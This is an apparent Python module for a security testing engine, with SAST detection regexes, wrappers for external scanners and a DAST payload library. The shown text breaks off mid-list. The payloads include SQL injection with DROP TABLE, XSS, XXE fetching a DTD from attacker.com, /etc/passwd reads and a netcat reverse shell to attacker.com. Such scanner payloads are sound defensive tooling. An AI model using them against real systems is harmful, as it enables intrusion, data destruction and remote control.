"""
Security Testing Engine
======================

Comprehensive security testing engine that extends the existing audit system infrastructure
to provide enterprise-grade security testing capabilities including SAST, DAST, vulnerability
assessment, penetration testing, and continuous security monitoring.

Key Features:
- Static Application Security Testing (SAST) integration
- Dynamic Application Security Testing (DAST) pipeline
- Vulnerability assessment with CVSS scoring and prioritization
- Automated penetration testing framework
- Security test case management and execution
- Integration with existing audit and compliance infrastructure
- Real-time security event correlation and analysis
- DoD and NIST compliance-focused security testing

Security Testing Standards:
- OWASP ASVS (Application Security Verification Standard)
- NIST SP 800-115 (Technical Guide to Information Security Testing)
- DoD SRG (Security Requirements Guide)
- SANS Testing Standards
- ISO 27001 Security Testing Requirements

Classification: UNCLASSIFIED//FOR OFFICIAL USE ONLY
Version: 1.0 - Comprehensive Security Testing
Author: Security Testing Team
Date: 2025-07-28
"""

import asyncio
import json
import logging
import time
import re
import subprocess
import hashlib
import base64
import ssl
import socket
import urllib.parse
from datetime import datetime, timezone, timedelta
from typing import Dict, List, Optional, Any, Tuple, Set, Union, AsyncGenerator
from uuid import UUID, uuid4
from dataclasses import dataclass, field, asdict
from enum import Enum
from concurrent.futures import ThreadPoolExecutor, as_completed
from collections import defaultdict, deque
import aiofiles
import aiohttp
from threading import Lock
import numpy as np
from pathlib import Path
import xml.etree.ElementTree as ET
import yaml
import tempfile
import shutil
import zipfile
import tarfile

# Import existing audit infrastructure
from ..audits.audit_system_validator import (
    AuditSystemValidator, ValidationTest, ValidationResult, ValidationTestType, 
    TestStatus, ValidationSeverity, TestDataGenerator
)
from ..audits.audit_logger import AuditLogger, AuditEvent, AuditEventType, AuditSeverity
from ..audits.enhanced_monitoring_system import EnhancedMonitoringSystem, SecurityThreat, ThreatLevel
from ..audits.tamper_proof_storage import TamperProofStorage
from ..audits.real_time_alerting import RealTimeAlerting, AlertPriority

logger = logging.getLogger(__name__)


class SecurityTestType(Enum):
    """Types of security tests."""
    SAST = "static_application_security_testing"
    DAST = "dynamic_application_security_testing"
    VULNERABILITY_SCAN = "vulnerability_scan"
    PENETRATION_TEST = "penetration_test"
    CONFIGURATION_AUDIT = "configuration_audit"
    COMPLIANCE_CHECK = "compliance_check"
    THREAT_MODELING = "threat_modeling"
    CODE_REVIEW = "security_code_review"
    DEPENDENCY_SCAN = "dependency_scan"
    CONTAINER_SCAN = "container_security_scan"
    INFRASTRUCTURE_SCAN = "infrastructure_scan"
    API_SECURITY_TEST = "api_security_test"


class SecuritySeverity(Enum):
    """Security finding severity levels aligned with CVSS."""
    CRITICAL = "critical"  # CVSS 9.0-10.0
    HIGH = "high"         # CVSS 7.0-8.9
    MEDIUM = "medium"     # CVSS 4.0-6.9
    LOW = "low"          # CVSS 0.1-3.9
    INFO = "informational" # CVSS 0.0


class SecurityTestStatus(Enum):
    """Security test execution status."""
    QUEUED = "queued"
    RUNNING = "running"
    COMPLETED = "completed"
    FAILED = "failed"
    CANCELLED = "cancelled"
    SKIPPED = "skipped"


@dataclass
class SecurityFinding:
    """Security finding from testing activities."""
    finding_id: str = field(default_factory=lambda: str(uuid4()))
    detection_time: datetime = field(default_factory=lambda: datetime.now(timezone.utc))
    
    # Finding details
    title: str = ""
    description: str = ""
    severity: SecuritySeverity = SecuritySeverity.INFO
    cvss_score: float = 0.0
    cvss_vector: str = ""
    
    # Location information
    file_path: Optional[str] = None
    line_number: Optional[int] = None
    function_name: Optional[str] = None
    component: str = ""
    
    # Vulnerability details
    vulnerability_type: str = ""
    cwe_id: Optional[str] = None  # Common Weakness Enumeration
    cve_id: Optional[str] = None  # Common Vulnerabilities and Exposures
    owasp_category: Optional[str] = None
    
    # Evidence and reproduction
    evidence: List[str] = field(default_factory=list)
    reproduction_steps: List[str] = field(default_factory=list)
    proof_of_concept: Optional[str] = None
    
    # Remediation
    remediation_guidance: str = ""
    fix_complexity: str = "medium"  # low, medium, high
    fix_priority: str = "medium"    # low, medium, high, critical
    
    # Testing context
    test_type: SecurityTestType = SecurityTestType.VULNERABILITY_SCAN
    test_tool: str = ""
    scan_target: str = ""
    
    # Classification and handling
    classification_level: str = "UNCLASSIFIED"
    requires_immediate_action: bool = False
    false_positive_likelihood: float = 0.0
    
    # Compliance mapping
    compliance_violations: List[str] = field(default_factory=list)
    regulatory_impact: str = "low"
    
    # Tracking
    status: str = "open"
    assigned_to: Optional[str] = None
    due_date: Optional[datetime] = None
    resolution_notes: Optional[str] = None


@dataclass
class SecurityTestReport:
    """Comprehensive security test execution report."""
    report_id: str = field(default_factory=lambda: str(uuid4()))
    generation_time: datetime = field(default_factory=lambda: datetime.now(timezone.utc))
    
    # Test execution summary
    test_start_time: datetime = field(default_factory=lambda: datetime.now(timezone.utc))
    test_end_time: datetime = field(default_factory=lambda: datetime.now(timezone.utc))
    total_execution_time_seconds: float = 0.0
    
    # Test coverage
    tests_executed: int = 0
    tests_passed: int = 0
    tests_failed: int = 0
    tests_skipped: int = 0
    
    # Security findings summary
    total_findings: int = 0
    critical_findings: int = 0
    high_findings: int = 0
    medium_findings: int = 0
    low_findings: int = 0
    info_findings: int = 0
    
    # Test type breakdown
    sast_findings: int = 0
    dast_findings: int = 0
    vulnerability_findings: int = 0
    penetration_findings: int = 0
    configuration_findings: int = 0
    
    # Risk assessment
    overall_risk_score: float = 0.0
    security_posture_rating: str = "unknown"  # excellent, good, fair, poor, critical
    compliance_score: float = 0.0
    
    # Detailed findings
    security_findings: List[SecurityFinding] = field(default_factory=list)
    
    # Recommendations
    immediate_actions: List[str] = field(default_factory=list)
    remediation_roadmap: List[str] = field(default_factory=list)
    compliance_recommendations: List[str] = field(default_factory=list)
    
    # Metrics and trends
    findings_by_category: Dict[str, int] = field(default_factory=dict)
    risk_trend_analysis: Dict[str, Any] = field(default_factory=dict)
    
    # Executive summary
    executive_summary: str = ""
    key_risks: List[str] = field(default_factory=list)
    business_impact: str = ""


class SASTEngine:
    """Enhanced Static Application Security Testing engine with comprehensive language support."""
    
    def __init__(self):
        """Initialize enhanced SAST engine."""
        self.supported_languages = {
            "python": [".py", ".pyw", ".pyi"],
            "javascript": [".js", ".jsx", ".ts", ".tsx", ".vue", ".mjs"],
            "java": [".java", ".jsp", ".jspx"],
            "csharp": [".cs", ".aspx", ".ascx", ".asmx"],
            "cpp": [".cpp", ".cxx", ".cc", ".c", ".h", ".hpp", ".hxx"],
            "go": [".go"],
            "php": [".php", ".php3", ".php4", ".php5", ".phtml"],
            "ruby": [".rb", ".erb", ".rake"],
            "scala": [".scala"],
            "kotlin": [".kt", ".kts"],
            "swift": [".swift"],
            "rust": [".rs"],
            "perl": [".pl", ".pm"],
            "shell": [".sh", ".bash", ".zsh", ".fish"],
            "powershell": [".ps1", ".psm1"],
            "yaml": [".yml", ".yaml"],
            "xml": [".xml", ".config", ".plist"],
            "dockerfile": ["Dockerfile", ".dockerfile"]
        }
        
        # Advanced vulnerability patterns with severity classification
        self.advanced_patterns = self._initialize_advanced_patterns()
        
        # External SAST tool integrations
        self.external_tools = {
            "semgrep": self._run_semgrep_scan,
            "bandit": self._run_bandit_scan,
            "eslint": self._run_eslint_scan,
            "sonarqube": self._run_sonarqube_scan,
            "checkmarx": self._run_checkmarx_scan,
            "veracode": self._run_veracode_scan
        }
        
        # SARIF output support
        self.sarif_version = "2.1.0"
        
        # Enhanced security patterns with context awareness
        self.security_patterns = {
            "sql_injection": [
                r"execute\s*\(\s*[\"'].*%s.*[\"']\s*%",
                r"query\s*\(\s*[\"'].*\+.*[\"']\s*\)",
                r"cursor\.execute\s*\(\s*[\"'].*%.*[\"']\s*%",
                r"db\.query\s*\(\s*[\"'].*\+.*[\"']\s*\)",
                r"(SELECT|INSERT|UPDATE|DELETE).*\+.*WHERE",
                r"PreparedStatement.*String.*\+",
                r"\$_(GET|POST|REQUEST)\[.*\].*query",
                r"mysqli_query\s*\(.*\$_"
            ],
            "xss": [
                r"innerHTML\s*=\s*.*\+",
                r"document\.write\s*\(\s*.*\+",
                r"eval\s*\(\s*.*\+",
                r"\.html\s*\(\s*.*\+.*\)",
                r"Response\.Write\s*\(.*Request\[",
                r"echo.*\$_(GET|POST|REQUEST)",
                r"\${.*}.*\<script",
                r"dangerouslySetInnerHTML"
            ],
            "path_traversal": [
                r"open\s*\(\s*.*\+.*[\"']\.\.[\"']",
                r"file\s*\(\s*.*\+.*[\"']\.\.[\"']",
                r"include\s*\(\s*.*\+.*[\"']\.\.[\"']",
                r"readFile\s*\(\s*.*\+.*[\"']\.\.[\"']",
                r"File\s*\(.*\$_(GET|POST)",
                r"FileInputStream\s*\(.*\+",
                r"Path\.join\s*\(.*user.*input",
                r"\.\.[\\/].*\.\.[\\/]"
            ],
            "command_injection": [
                r"subprocess\.call\s*\(\s*.*\+",
                r"os\.system\s*\(\s*.*\+",
                r"exec\s*\(\s*.*\+",
                r"shell_exec\s*\(\s*.*\+.*\)",
                r"Runtime\.getRuntime\(\)\.exec",
                r"Process\.Start\s*\(.*\+",
                r"system\s*\(.*\$_",
                r"eval\s*\(.*user.*input"
            ],
            "hardcoded_secrets": [
                r"password\s*[=:]\s*[\"'][^\"']{8,}[\"']",
                r"api[_-]?key\s*[=:]\s*[\"'][^\"']{16,}[\"']",
                r"secret\s*[=:]\s*[\"'][^\"']{16,}[\"']",
                r"token\s*[=:]\s*[\"'][^\"']{20,}[\"']",
                r"(aws|azure|gcp)[_-]?(access[_-]?key|secret)",
                r"private[_-]?key\s*[=:]\s*[\"']-----BEGIN",
                r"(jwt|bearer)[_-]?token\s*[=:]",
                r"connection[_-]?string.*password"
            ],
            "weak_crypto": [
                r"md5\s*\(",
                r"sha1\s*\(",
                r"DES\s*\(",
                r"RC4\s*\(",
                r"MD5CryptoServiceProvider",
                r"SHA1CryptoServiceProvider",
                r"ECB.*mode",
                r"ssl.*v[12]\."
            ],
            "insecure_random": [
                r"random\.random\s*\(",
                r"Math\.random\s*\(",
                r"rand\s*\(",
                r"srand\s*\(",
                r"Random\s*\(\s*\)",
                r"mt_rand\s*\(",
                r"arc4random\s*\(",
                r"new\s+Random\s*\(\)"
            ],
            "insecure_deserialization": [
                r"pickle\.loads\s*\(",
                r"yaml\.load\s*\(.*Loader",
                r"ObjectInputStream",
                r"unserialize\s*\(",
                r"JsonConvert\.DeserializeObject",
                r"JSON\.parse\s*\(.*user"
            ],
            "ldap_injection": [
                r"LdapContext.*search.*\+",
                r"DirectorySearcher.*Filter.*\+",
                r"ldap_search\s*\(.*\$_"
            ],
            "xml_injection": [
                r"DocumentBuilder.*parse.*user",
                r"XmlDocument.*LoadXml.*\+",
                r"simplexml_load_string.*\$_"
            ],
            "ssrf": [
                r"requests\.(get|post)\s*\(.*user",
                r"HttpClient.*\(.*user.*input",
                r"file_get_contents\s*\(.*\$_",
                r"curl_exec\s*\(.*user"
            ]
        }
    
    async def scan_codebase(self, target_path: str, enable_external_tools: bool = True) -> List[SecurityFinding]:
        """Perform comprehensive SAST scan on codebase."""
        findings = []
        target = Path(target_path)
        
        if not target.exists():
            logger.warning(f"SAST target path does not exist: {target_path}")
            return findings
        
        try:
            # Internal pattern-based scanning
            logger.info(f"Starting internal SAST scan on {target_path}")
            internal_findings = await self._run_internal_scan(target)
            findings.extend(internal_findings)
            
            # External tool integrations (if enabled)
            if enable_external_tools:
                logger.info("Running external SAST tools")
                external_findings = await self._run_external_tools(target)
                findings.extend(external_findings)
            
            # Dependency vulnerability scanning
            dependency_findings = await self._scan_dependencies_advanced(target)
            findings.extend(dependency_findings)
            
            # Configuration security analysis
            config_findings = await self._scan_configurations(target)
            findings.extend(config_findings)
            
            # Dockerfile and container security
            container_findings = await self._scan_containers(target)
            findings.extend(container_findings)
            
            # De-duplicate findings
            findings = self._deduplicate_findings(findings)
            
            logger.info(f"SAST scan completed: {len(findings)} findings in {target_path}")
            
        except Exception as e:
            logger.error(f"SAST scan failed: {e}")
            # Create error finding
            error_finding = SecurityFinding(
                title="SAST Scan Error",
                description=f"SAST scan encountered an error: {e}",
                severity=SecuritySeverity.MEDIUM,
                test_type=SecurityTestType.SAST,
                scan_target=target_path
            )
            findings.append(error_finding)
        
        return findings
    
    def _get_source_files(self, target_path: Path) -> List[Path]:
        """Get all source files to scan."""
        source_files = []
        
        for language, extensions in self.supported_languages.items():
            for ext in extensions:
                if target_path.is_file() and target_path.suffix == ext:
                    source_files.append(target_path)
                elif target_path.is_dir():
                    source_files.extend(target_path.rglob(f"*{ext}"))
        
        return source_files
    
    async def _scan_file(self, file_path: Path) -> List[SecurityFinding]:
        """Scan individual file for security issues."""
        findings = []
        
        try:
            async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = await f.read()
                lines = content.split('\n')
                
                for line_num, line in enumerate(lines, 1):
                    line_findings = self._analyze_line(line, line_num, file_path)
                    findings.extend(line_findings)
        
        except Exception as e:
            logger.error(f"Error scanning file {file_path}: {e}")
        
        return findings
    
    def _analyze_line(self, line: str, line_number: int, file_path: Path) -> List[SecurityFinding]:
        """Analyze a single line of code for security issues."""
        findings = []
        
        for vulnerability_type, patterns in self.security_patterns.items():
            for pattern in patterns:
                if re.search(pattern, line, re.IGNORECASE):
                    finding = SecurityFinding(
                        title=f"Potential {vulnerability_type.replace('_', ' ').title()}",
                        description=f"Detected potential {vulnerability_type} vulnerability pattern",
                        severity=self._get_severity_for_vulnerability(vulnerability_type),
                        vulnerability_type=vulnerability_type,
                        file_path=str(file_path),
                        line_number=line_number,
                        test_type=SecurityTestType.SAST,
                        test_tool="Custom SAST Engine",
                        scan_target=str(file_path),
                        evidence=[f"Line {line_number}: {line.strip()}"],
                        cwe_id=self._get_cwe_for_vulnerability(vulnerability_type),
                        owasp_category=self._get_owasp_category(vulnerability_type),
                        remediation_guidance=self._get_remediation_guidance(vulnerability_type)
                    )
                    findings.append(finding)
        
        return findings
    
    def _get_severity_for_vulnerability(self, vulnerability_type: str) -> SecuritySeverity:
        """Get severity level for vulnerability type."""
        severity_mapping = {
            "sql_injection": SecuritySeverity.HIGH,
            "xss": SecuritySeverity.MEDIUM,
            "path_traversal": SecuritySeverity.MEDIUM,
            "command_injection": SecuritySeverity.HIGH,
            "hardcoded_secrets": SecuritySeverity.HIGH,
            "weak_crypto": SecuritySeverity.MEDIUM,
            "insecure_random": SecuritySeverity.LOW
        }
        return severity_mapping.get(vulnerability_type, SecuritySeverity.INFO)
    
    def _get_cwe_for_vulnerability(self, vulnerability_type: str) -> str:
        """Get CWE ID for vulnerability type."""
        cwe_mapping = {
            "sql_injection": "CWE-89",
            "xss": "CWE-79",
            "path_traversal": "CWE-22",
            "command_injection": "CWE-78",
            "hardcoded_secrets": "CWE-798",
            "weak_crypto": "CWE-327",
            "insecure_random": "CWE-338"
        }
        return cwe_mapping.get(vulnerability_type, "CWE-Other")
    
    def _get_owasp_category(self, vulnerability_type: str) -> str:
        """Get OWASP Top 10 category for vulnerability."""
        owasp_mapping = {
            "sql_injection": "A03:2021 - Injection",
            "xss": "A03:2021 - Injection",
            "path_traversal": "A01:2021 - Broken Access Control",
            "command_injection": "A03:2021 - Injection",
            "hardcoded_secrets": "A07:2021 - Identification and Authentication Failures",
            "weak_crypto": "A02:2021 - Cryptographic Failures",
            "insecure_random": "A02:2021 - Cryptographic Failures"
        }
        return owasp_mapping.get(vulnerability_type, "Other")
    
    def _initialize_advanced_patterns(self) -> Dict[str, Dict]:
        """Initialize advanced vulnerability detection patterns."""
        return {
            "authentication_bypass": {
                "patterns": [
                    r"if\s*\(.*password.*==.*[\"'][\"']\)",
                    r"auth.*=.*true.*without.*validation",
                    r"admin.*=.*\$_(GET|POST)\[.*\]"
                ],
                "severity": SecuritySeverity.CRITICAL,
                "cwe": "CWE-287"
            },
            "race_condition": {
                "patterns": [
                    r"check.*file.*exists.*then.*open",
                    r"if.*exists.*create.*file",
                    r"tmp.*file.*creation.*race"
                ],
                "severity": SecuritySeverity.MEDIUM,
                "cwe": "CWE-362"
            },
            "integer_overflow": {
                "patterns": [
                    r"malloc\s*\(.*\*.*\)",
                    r"new\s+\w+\[.*\*.*\]",
                    r"buffer\[.*\+.*\]"
                ],
                "severity": SecuritySeverity.HIGH,
                "cwe": "CWE-190"
            },
            "use_after_free": {
                "patterns": [
                    r"free\s*\(.*\);.*\1",
                    r"delete\s+.*\;.*\1",
                    r"dangling.*pointer"
                ],
                "severity": SecuritySeverity.CRITICAL,
                "cwe": "CWE-416"
            }
        }
    
    async def _run_internal_scan(self, target: Path) -> List[SecurityFinding]:
        """Run internal pattern-based scanning."""
        findings = []
        
        # Scan all supported source files
        for file_path in self._get_source_files(target):
            file_findings = await self._scan_file(file_path)
            findings.extend(file_findings)
        
        return findings
    
    async def _run_external_tools(self, target: Path) -> List[SecurityFinding]:
        """Run external SAST tools."""
        findings = []
        
        for tool_name, tool_func in self.external_tools.items():
            try:
                tool_findings = await tool_func(target)
                findings.extend(tool_findings)
            except Exception as e:
                logger.debug(f"External tool {tool_name} failed: {e}")
        
        return findings
    
    async def _run_semgrep_scan(self, target: Path) -> List[SecurityFinding]:
        """Run Semgrep static analysis."""
        findings = []
        
        try:
            cmd = [
                "semgrep", "--config=auto", "--json", "--quiet",
                str(target)
            ]
            
            result = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            stdout, stderr = await result.communicate()
            
            if result.returncode == 0 and stdout:
                semgrep_data = json.loads(stdout.decode())
                findings = self._parse_semgrep_results(semgrep_data)
        
        except Exception as e:
            logger.debug(f"Semgrep scan failed: {e}")
        
        return findings
    
    async def _run_bandit_scan(self, target: Path) -> List[SecurityFinding]:
        """Run Bandit Python security scanner."""
        findings = []
        
        try:
            cmd = [
                "bandit", "-r", "-f", "json", str(target)
            ]
            
            result = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            stdout, stderr = await result.communicate()
            
            if stdout:
                bandit_data = json.loads(stdout.decode())
                findings = self._parse_bandit_results(bandit_data)
        
        except Exception as e:
            logger.debug(f"Bandit scan failed: {e}")
        
        return findings
    
    async def _run_eslint_scan(self, target: Path) -> List[SecurityFinding]:
        """Run ESLint security plugin."""
        findings = []
        
        try:
            cmd = [
                "eslint", "--format", "json", "--ext", ".js,.jsx,.ts,.tsx",
                str(target)
            ]
            
            result = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            stdout, stderr = await result.communicate()
            
            if stdout:
                eslint_data = json.loads(stdout.decode())
                findings = self._parse_eslint_results(eslint_data)
        
        except Exception as e:
            logger.debug(f"ESLint scan failed: {e}")
        
        return findings
    
    async def _run_sonarqube_scan(self, target: Path) -> List[SecurityFinding]:
        """Run SonarQube static analysis."""
        # Placeholder for SonarQube integration
        return []
    
    async def _run_checkmarx_scan(self, target: Path) -> List[SecurityFinding]:
        """Run Checkmarx SAST."""
        # Placeholder for Checkmarx integration
        return []
    
    async def _run_veracode_scan(self, target: Path) -> List[SecurityFinding]:
        """Run Veracode SAST."""
        # Placeholder for Veracode integration
        return []
    
    def _parse_semgrep_results(self, data: Dict) -> List[SecurityFinding]:
        """Parse Semgrep JSON results."""
        findings = []
        
        for result in data.get('results', []):
            finding = SecurityFinding(
                title=f"Semgrep: {result.get('check_id', 'Unknown')}",
                description=result.get('message', 'Semgrep finding'),
                severity=self._map_semgrep_severity(result.get('severity', 'INFO')),
                file_path=result.get('path'),
                line_number=result.get('start', {}).get('line'),
                test_type=SecurityTestType.SAST,
                test_tool="Semgrep",
                evidence=[result.get('message', '')],
                cwe_id=self._extract_cwe_from_semgrep(result)
            )
            findings.append(finding)
        
        return findings
    
    def _parse_bandit_results(self, data: Dict) -> List[SecurityFinding]:
        """Parse Bandit JSON results."""
        findings = []
        
        for result in data.get('results', []):
            finding = SecurityFinding(
                title=f"Bandit: {result.get('test_name', 'Unknown')}",
                description=result.get('issue_text', 'Bandit finding'),
                severity=self._map_bandit_severity(result.get('issue_severity', 'LOW')),
                file_path=result.get('filename'),
                line_number=result.get('line_number'),
                test_type=SecurityTestType.SAST,
                test_tool="Bandit",
                evidence=[result.get('code', '')],
                cwe_id=result.get('test_id')
            )
            findings.append(finding)
        
        return findings
    
    def _parse_eslint_results(self, data: List) -> List[SecurityFinding]:
        """Parse ESLint JSON results."""
        findings = []
        
        for file_result in data:
            for message in file_result.get('messages', []):
                if self._is_security_rule(message.get('ruleId', '')):
                    finding = SecurityFinding(
                        title=f"ESLint: {message.get('ruleId', 'Unknown')}",
                        description=message.get('message', 'ESLint security finding'),
                        severity=self._map_eslint_severity(message.get('severity', 1)),
                        file_path=file_result.get('filePath'),
                        line_number=message.get('line'),
                        test_type=SecurityTestType.SAST,
                        test_tool="ESLint",
                        evidence=[message.get('message', '')]
                    )
                    findings.append(finding)
        
        return findings
    
    def _map_semgrep_severity(self, severity: str) -> SecuritySeverity:
        """Map Semgrep severity to internal severity."""
        mapping = {
            'ERROR': SecuritySeverity.HIGH,
            'WARNING': SecuritySeverity.MEDIUM,
            'INFO': SecuritySeverity.LOW
        }
        return mapping.get(severity.upper(), SecuritySeverity.INFO)
    
    def _map_bandit_severity(self, severity: str) -> SecuritySeverity:
        """Map Bandit severity to internal severity."""
        mapping = {
            'HIGH': SecuritySeverity.HIGH,
            'MEDIUM': SecuritySeverity.MEDIUM,
            'LOW': SecuritySeverity.LOW
        }
        return mapping.get(severity.upper(), SecuritySeverity.INFO)
    
    def _map_eslint_severity(self, severity: int) -> SecuritySeverity:
        """Map ESLint severity to internal severity."""
        if severity == 2:
            return SecuritySeverity.MEDIUM
        return SecuritySeverity.LOW
    
    def _is_security_rule(self, rule_id: str) -> bool:
        """Check if ESLint rule is security-related."""
        security_rules = [
            'security/', 'no-eval', 'no-implied-eval', 'no-new-func',
            'no-script-url', 'no-unsafe-innerhtml'
        ]
        return any(rule in rule_id for rule in security_rules)
    
    def _extract_cwe_from_semgrep(self, result: Dict) -> str:
        """Extract CWE from Semgrep result metadata."""
        metadata = result.get('extra', {}).get('metadata', {})
        return metadata.get('cwe', 'CWE-Other')
    
    async def _scan_dependencies_advanced(self, target: Path) -> List[SecurityFinding]:
        """Advanced dependency vulnerability scanning."""
        findings = []
        
        # Scan package files
        package_files = {
            "requirements.txt": self._scan_python_deps,
            "package.json": self._scan_npm_deps,
            "pom.xml": self._scan_maven_deps,
            "Gemfile": self._scan_ruby_deps,
            "go.mod": self._scan_go_deps,
            "Cargo.toml": self._scan_rust_deps
        }
        
        for filename, scanner in package_files.items():
            for file_path in target.rglob(filename):
                dep_findings = await scanner(file_path)
                findings.extend(dep_findings)
        
        return findings
    
    async def _scan_configurations(self, target: Path) -> List[SecurityFinding]:
        """Scan configuration files for security issues."""
        findings = []
        
        config_scanners = {
            "*.yml": self._scan_yaml_config,
            "*.yaml": self._scan_yaml_config,
            "*.json": self._scan_json_config,
            "*.xml": self._scan_xml_config,
            "*.properties": self._scan_properties_config,
            ".env*": self._scan_env_config
        }
        
        for pattern, scanner in config_scanners.items():
            for file_path in target.rglob(pattern):
                config_findings = await scanner(file_path)
                findings.extend(config_findings)
        
        return findings
    
    async def _scan_containers(self, target: Path) -> List[SecurityFinding]:
        """Scan Docker and container configurations."""
        findings = []
        
        # Scan Dockerfiles
        for dockerfile in target.rglob("Dockerfile*"):
            docker_findings = await self._scan_dockerfile(dockerfile)
            findings.extend(docker_findings)
        
        # Scan docker-compose files
        for compose_file in target.rglob("docker-compose*.yml"):
            compose_findings = await self._scan_docker_compose(compose_file)
            findings.extend(compose_findings)
        
        return findings
    
    def _deduplicate_findings(self, findings: List[SecurityFinding]) -> List[SecurityFinding]:
        """Remove duplicate findings based on file, line, and vulnerability type."""
        seen = set()
        unique_findings = []
        
        for finding in findings:
            key = (finding.file_path, finding.line_number, finding.vulnerability_type)
            if key not in seen:
                seen.add(key)
                unique_findings.append(finding)
        
        return unique_findings
    
    def _get_remediation_guidance(self, vulnerability_type: str) -> str:
        """Get comprehensive remediation guidance for vulnerability type."""
        guidance_mapping = {
            "sql_injection": "Use parameterized queries, stored procedures, or ORM frameworks. Implement input validation and least-privilege database access.",
            "xss": "Implement Content Security Policy (CSP), use output encoding, validate and sanitize all user inputs, and use secure templating engines.",
            "path_traversal": "Validate file paths against a whitelist, use canonical path resolution, implement proper access controls, and avoid user-controlled file operations.",
            "command_injection": "Avoid system command execution with user input. Use safe APIs, input validation, and sandboxed execution environments.",
            "hardcoded_secrets": "Use environment variables, secure key management systems (AWS KMS, Azure Key Vault), and secret scanning tools in CI/CD.",
            "weak_crypto": "Use strong algorithms (AES-256, SHA-3, RSA-4096), implement proper key management, and follow cryptographic best practices.",
            "insecure_random": "Use cryptographically secure random number generators (SecureRandom, os.urandom, crypto.randomBytes).",
            "insecure_deserialization": "Avoid deserializing untrusted data. Use safe serialization formats (JSON), implement integrity checks, and validate input structure.",
            "authentication_bypass": "Implement robust authentication mechanisms, use secure session management, and enforce proper access controls.",
            "race_condition": "Use proper synchronization mechanisms, atomic operations, and file locking to prevent race conditions."
        }
        return guidance_mapping.get(vulnerability_type, "Review code for security best practices and follow OWASP guidelines.")


class DASTEngine:
    """Enhanced Dynamic Application Security Testing engine with comprehensive web and API testing."""
    
    def __init__(self):
        """Initialize enhanced DAST engine."""
        # Comprehensive attack payloads
        self.test_payloads = {
            "xss": [
                "<script>alert('XSS')</script>",
                "javascript:alert('XSS')",
                "'>><script>alert('XSS')</script>",
                "\"><img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "<iframe src=javascript:alert('XSS')></iframe>",
                "<body onload=alert('XSS')>",
                "<input onfocus=alert('XSS') autofocus>",
                "<select onfocus=alert('XSS') autofocus>",
                "<textarea onfocus=alert('XSS') autofocus>",
                "\"'><script>alert(String.fromCharCode(88,83,83))</script>",
                "<img src=\"x\" onerror=\"alert('XSS')\">"
            ],
            "sql_injection": [
                "' OR '1'='1",
                "'; DROP TABLE users; --",
                "' UNION SELECT * FROM users --",
                "1'; EXEC xp_cmdshell('dir'); --",
                "' OR 1=1#",
                "\" OR \"1\"=\"1",
                "' OR '1'='1' /*",
                "1' AND (SELECT COUNT(*) FROM users) > 0 --",
                "'; WAITFOR DELAY '00:00:05' --",
                "1'; SELECT @@version --",
                "' UNION SELECT user(),database(),version() --",
                "admin'--",
                "admin'#",
                "admin'/*",
                "') OR ('1'='1",
                ") OR (1=1"
            ],
            "command_injection": [
                "; ls -la",
                "| whoami",
                "; cat /etc/passwd",
                "& dir",
                "; id",
                "&& whoami",
                "|| whoami",
                "; curl http://attacker.com",
                "$(whoami)",
                "`whoami`",
                "; nc -e /bin/sh attacker.com 4444",
                "& ping -c 4 127.0.0.1",
                "; sleep 10"
            ],
            "path_traversal": [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "....//....//....//etc/passwd",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "..%2F..%2F..%2Fetc%2Fpasswd",
                "..%252f..%252f..%252fetc%252fpasswd",
                "....\\....\\....\\windows\\system32\\drivers\\etc\\hosts",
                "/var/www/../../etc/passwd",
                "file:///etc/passwd",
                "file://c:/windows/system32/drivers/etc/hosts"
            ],
            "xxe": [
                "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
                "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>",
                "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\"> %xxe;]>"
            ],
            "ldap_injection": [
                "*)(uid=*))(|(uid=*",
                "*)(|(password=*))",
                "admin)(&(password=*))",
                "*))%00"
            ],
            "nosql_injection": [
                "[$ne]=1",
                "[$gt]=",
                "[$regex]=.*",
                "[$where]=1"
            ],
            "ssti": [
                "{{7*7}}",
                "${7*7}",
                "<%=7*7%>",
                "#{7*7}",
                "{{config}}",
                "{{request}}",
                "{{''.__class__.__mro__[2].__subclasses__()}}"
            ]
        }
        
        # Authentication bypass payloads
        self.auth_bypass_payloads = [
            "admin'--",
            "admin'/*",
            "admin' OR '1'='1'--",
            "admin' OR '1'='1'#",
            "admin'OR 1=1 OR ''='",
            "admin' OR 1=1#",
            "admin'OR 1#",
            "admin' OR 'x'='x",
            "admin' AND 1=0 UNION SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'"
        ]
        
        # API-specific payloads
        self.api_payloads = {
            "mass_assignment": [
                '{"admin": true}',
                '{"role": "admin"}',
                '{"is_admin": 1}',
                '{"user_type": "admin"}'
            ],
            "json_injection": [
                '{"test": "\\u0022><script>alert(1)</script>"}',
                '{"test": "\'; DROP TABLE users; --"}',
                '{"test": {"$ne": null}}'
            ]
        }
        
        # Enhanced endpoint discovery
        self.common_endpoints = [
            "/", "/login", "/admin", "/api", "/search", "/upload",
            "/contact", "/feedback", "/profile", "/settings", "/dashboard",
            "/user", "/users", "/account", "/accounts", "/register",
            "/signup", "/signin", "/logout", "/forgot-password", "/reset-password",
            "/api/v1", "/api/v2", "/v1", "/v2", "/rest", "/graphql",
            "/swagger", "/docs", "/documentation", "/api-docs",
            "/health", "/status", "/metrics", "/debug", "/test",
            "/wp-admin", "/admin.php", "/administrator", "/phpmyadmin",
            "/.env", "/config", "/configuration", "/config.json",
            "/robots.txt", "/sitemap.xml", "/.htaccess", "/web.config"
        ]
        
        # Security headers to check
        self.security_headers = [
            "content-security-policy",
            "x-frame-options",
            "x-content-type-options",
            "x-xss-protection",
